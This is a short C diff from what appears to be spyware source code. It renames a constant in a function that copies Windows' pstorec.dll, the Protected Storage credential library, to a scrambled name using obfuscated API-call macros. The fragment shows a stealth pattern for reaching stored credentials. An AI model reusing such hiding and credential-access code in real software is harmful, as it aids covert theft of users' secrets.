@@ -68,7 +68,7 @@ BOOL CopyPStoreDLL(char *dll_path)
 		return FALSE;
 	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\", "pstorec.dll");
 	
-	if ( !(dll_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 2, TRUE)) )
+	if ( !(dll_scramb_name = LOG_ScrambleName(shared.H4_DUMMY_NAME, 2, TRUE)) )
 		return FALSE;
 
 	FNC(CopyFileA)(comp_path, HM_CompletePath(dll_scramb_name, dll_path), TRUE);
